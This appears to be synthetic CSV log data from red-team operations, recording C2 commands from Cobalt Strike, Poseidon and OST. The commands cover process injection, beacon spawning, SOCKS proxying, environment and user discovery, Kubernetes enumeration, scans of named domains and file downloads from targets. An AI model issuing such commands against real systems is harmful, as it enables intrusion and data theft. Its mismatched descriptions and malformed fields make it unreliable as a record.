entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
2153,2024-04-11 15:38:09,2024-05-04 20:39:13,148.64.118.11,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Jerry Gonzalez,,,
2154,2023-12-04 12:32:09,2024-05-06 12:32:03,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Alexander Kim,,,
2155,2024-01-03 10:04:39,2024-03-09 09:29:16,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Manuel Chase,,,
2156,2024-04-25 09:34:38,2024-05-06 22:13:25,35.14.5.27,66.1.255.186,Poseidon,alopez@dawson.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
2157,2024-02-28 05:44:11,2024-04-24 04:00:43,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Manuel Chase,,,
2158,2023-12-01 10:12:45,2024-02-20 16:43:09,116.163.112.137,149.55.234.226,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
2159,2024-06-16 22:20:15,2024-06-16 22:20:15.919744,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
2160,2024-01-28 06:52:32,2024-03-07 11:36:38,148.64.118.11,66.1.255.186,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Alexander Kim,,,
2161,2024-03-12 20:26:00,2024-03-29 10:58:24,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Manuel Chase,,,
2162,2023-08-07 20:30:56,2024-04-04 20:25:58,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
2163,2024-03-23 00:32:02,2024-04-23 10:03:52,35.14.5.27,66.1.255.186,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
2164,2024-03-26 12:14:57,2024-04-26 14:06:29,35.14.5.27,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
2165,2023-07-16 20:52:06,2024-01-27 23:53:18,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
2166,2023-12-10 16:43:17,2024-03-22 13:18:50,35.14.5.27,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Manuel Chase,,,
2167,2024-03-21 17:15:35,2024-04-29 07:29:06,148.64.118.11,66.1.255.186,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Alexander Kim,,,
2168,2024-06-27 12:54:58,2024-06-27 12:54:58.601789,116.163.112.137,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Jerry Gonzalez,,,
2169,2023-09-21 09:23:28,2024-01-02 12:24:22,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Alexander Kim,,,
2170,2024-03-04 04:59:40,2024-03-26 07:20:31,148.64.118.11,149.55.234.226,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Alexander Kim,,,
2171,2023-12-22 21:00:44,2024-03-08 10:40:11,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
2172,2023-07-15 07:31:28,2024-02-29 06:58:27,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
2173,2024-05-01 05:39:33,2024-05-06 10:47:40,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
2174,2024-02-16 03:35:32,2024-04-03 15:22:54,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
2175,2024-02-20 11:11:55,2024-05-09 09:04:33,148.64.118.11,55.167.201.151,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Manuel Chase,,,
2176,2023-12-30 10:29:57,2024-02-19 18:11:10,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
2177,2024-03-06 01:59:55,2024-04-25 07:53:55,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
2178,2024-02-27 21:05:07,2024-03-22 23:41:42,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
2179,2023-09-01 17:16:17,2024-02-12 03:40:45,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Alexander Kim,,,
2180,2024-03-10 14:57:55,2024-04-24 22:29:49,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Manuel Chase,,,
2181,2024-05-22 13:48:46,2024-05-22 13:48:46.385908,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Jerry Gonzalez,,,
2182,2023-12-22 01:01:16,2023-12-24 09:30:34,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Alexander Kim,,,
2183,2023-07-30 12:39:06,2023-08-04 20:58:48,35.14.5.27,55.167.201.151,Cobalt Strike,alopez@dawson.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
2184,2024-04-07 21:37:26,2024-04-15 03:55:27,35.14.5.27,55.167.201.151,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Manuel Chase,,,
2185,2024-05-30 15:14:18,2024-05-30 15:14:18.269556,35.14.5.27,55.167.201.151,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
2186,2024-06-14 20:54:34,2024-06-14 20:54:34.564469,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Manuel Chase,,,
2187,2023-08-27 20:03:48,2023-12-07 19:00:15,90.201.27.188,55.167.201.151,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2188,2024-06-03 06:21:14,2024-06-03 06:21:14.658977,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Alexander Kim,,,
2189,2024-02-05 23:35:03,2024-04-20 14:21:46,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Alexander Kim,,,
2190,2023-12-14 21:55:38,2024-03-02 01:20:48,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Jerry Gonzalez,,,
2191,2024-02-27 11:20:05,2024-03-21 03:01:29,90.201.27.188,55.167.201.151,Cobalt Strike,afranklin@harrison.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Alexander Kim,,,
2192,2024-02-11 05:00:42,2024-02-15 17:40:37,116.163.112.137,149.55.234.226,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Jerry Gonzalez,,,
2193,2023-12-16 02:06:12,2024-04-14 16:19:52,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Manuel Chase,,,
2194,2023-09-15 18:40:49,2024-02-15 10:39:55,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Manuel Chase,,,
2195,2024-05-05 02:08:53,2024-05-07 16:11:12,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
2196,2023-09-08 09:11:51,2023-11-26 01:19:40,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
2197,2023-08-05 18:39:37,2023-08-24 06:42:13,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Alexander Kim,,,
2198,2024-04-28 10:26:10,2024-04-30 07:08:47,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Manuel Chase,,,
2199,2024-05-30 01:11:40,2024-05-30 01:11:40.516346,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Alexander Kim,,,
2200,2024-02-21 04:06:19,2024-03-31 11:32:30,148.64.118.11,149.55.234.226,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Alexander Kim,,,
2201,2023-11-12 00:31:49,2024-05-07 04:20:26,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
2202,2023-07-19 03:30:03,2023-10-01 04:59:53,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Jerry Gonzalez,,,
2203,2023-12-17 03:33:41,2024-03-05 13:01:35,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
2204,2024-05-18 16:49:45,2024-05-18 16:49:45.705519,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
2205,2023-08-14 03:41:11,2024-02-15 13:47:52,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
2206,2024-05-19 01:41:53,2024-05-19 01:41:53.026580,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Jerry Gonzalez,,,
2207,2023-10-26 07:47:18,2024-03-24 15:42:42,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Success,Conducting container discovery,Alexander Kim,,,
2208,2024-05-10 14:20:01,2024-05-10 22:07:25,116.163.112.137,55.167.201.151,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Jerry Gonzalez,,,
2209,2024-03-21 17:11:37,2024-05-07 05:05:20,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Manuel Chase,,,
2210,2024-05-23 02:26:46,2024-05-23 02:26:46.475025,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Manuel Chase,,,
2211,2024-03-25 22:07:51,2024-04-15 08:11:12,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
2212,2023-12-06 09:06:26,2024-01-29 03:28:09,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
2213,2024-02-21 04:19:25,2024-03-08 22:54:58,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Success,Obtaining current working directory,Jerry Gonzalez,,,
2214,2023-11-25 22:02:30,2024-05-08 17:42:39,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
2215,2023-09-10 15:36:09,2024-04-13 22:32:38,116.163.112.137,55.167.201.151,OST,afranklin@harrison.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
2216,2023-10-09 10:27:33,2024-02-01 16:08:50,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Alexander Kim,,,
2217,2024-05-19 11:59:43,2024-05-19 11:59:43.421444,148.64.118.11,149.55.234.226,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
2218,2023-08-25 15:19:14,2023-11-06 14:54:22,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
2219,2023-11-15 04:21:42,2023-12-10 00:58:56,116.163.112.137,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Alexander Kim,,,
2220,2024-06-10 06:37:38,2024-06-10 06:37:38.053257,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Alexander Kim,,,
2221,2023-09-15 18:05:16,2023-11-20 21:15:47,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Manuel Chase,,,
2222,2024-06-06 17:58:21,2024-06-06 17:58:21.514975,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Jerry Gonzalez,,,
2223,2024-02-08 19:45:43,2024-04-26 20:10:06,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Jerry Gonzalez,,,
2224,2023-11-04 16:00:04,2023-11-26 10:09:06,148.64.118.11,55.167.201.151,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Alexander Kim,,,
2225,2023-08-21 03:12:11,2023-08-31 08:50:42,35.14.5.27,149.55.234.226,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Jerry Gonzalez,,,
2226,2024-01-08 06:02:59,2024-03-01 21:45:35,148.64.118.11,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
2227,2023-10-05 21:05:49,2024-02-24 08:25:29,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
2228,2024-02-28 16:43:10,2024-03-28 09:51:44,116.163.112.137,66.1.255.186,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
2229,2024-05-26 21:29:39,2024-05-26 21:29:39.795221,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
2230,2023-12-11 04:18:29,2023-12-22 22:01:02,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Manuel Chase,,,
2231,2023-11-13 05:55:36,2024-03-06 04:46:33,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
2232,2023-09-25 22:48:44,2023-09-29 01:29:53,35.14.5.27,66.1.255.186,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Alexander Kim,,,
2233,2024-05-31 22:00:48,2024-05-31 22:00:48.976217,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
2234,2024-03-24 01:17:37,2024-05-04 22:32:27,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Jerry Gonzalez,,,
2235,2023-12-21 18:48:31,2024-02-19 04:17:35,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Jerry Gonzalez,,,
2236,2023-11-29 20:54:55,2024-01-15 02:32:33,35.14.5.27,55.167.201.151,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
2237,2023-10-17 20:01:16,2024-01-23 20:41:33,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Manuel Chase,,,
2238,2023-10-26 23:04:31,2023-11-04 09:27:31,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Manuel Chase,,,
2239,2024-06-25 21:06:32,2024-06-25 21:06:32.897220,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Jerry Gonzalez,,,
2240,2023-12-09 19:05:56,2024-04-11 11:47:26,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Jerry Gonzalez,,,
2241,2024-05-13 11:20:38,2024-05-13 11:20:38.250447,148.64.118.11,149.55.234.226,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Manuel Chase,,,
2242,2024-01-16 13:34:24,2024-02-22 23:55:29,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Failed,Obtaining current working directory,Alexander Kim,,,
2243,2024-03-25 09:14:31,2024-04-18 02:39:10,90.201.27.188,55.167.201.151,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Alexander Kim,,,
2244,2024-02-15 06:53:02,2024-02-28 12:29:41,116.163.112.137,66.1.255.186,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
2245,2024-01-07 00:25:10,2024-01-22 17:56:49,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Jerry Gonzalez,,,
2246,2023-10-27 23:49:32,2024-03-23 10:07:30,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Jerry Gonzalez,,,
2247,2023-09-13 06:46:47,2023-09-17 08:19:57,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Alexander Kim,,,
2248,2024-01-10 09:03:26,2024-02-18 15:10:10,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Alexander Kim,,,
2249,2023-07-14 16:19:59,2023-10-29 09:39:22,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Alexander Kim,,,
2250,2024-04-29 22:18:19,2024-05-10 07:06:36,35.14.5.27,149.55.234.226,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Jerry Gonzalez,,,
2251,2023-12-07 04:59:24,2024-01-27 10:58:31,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Jerry Gonzalez,,,
2252,2023-07-19 11:31:43,2024-02-23 00:41:48,116.163.112.137,149.55.234.226,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Failed,Obtaining current working directory,Alexander Kim,,,
2253,2023-11-05 13:50:42,2024-02-08 01:31:30,90.201.27.188,66.1.255.186,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
2254,2023-09-22 10:32:35,2024-02-22 07:30:36,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Jerry Gonzalez,,,
2255,2024-06-09 10:31:05,2024-06-09 10:31:05.343584,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Jerry Gonzalez,,,
2256,2024-06-17 11:25:00,2024-06-17 11:25:00.760902,116.163.112.137,149.55.234.226,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
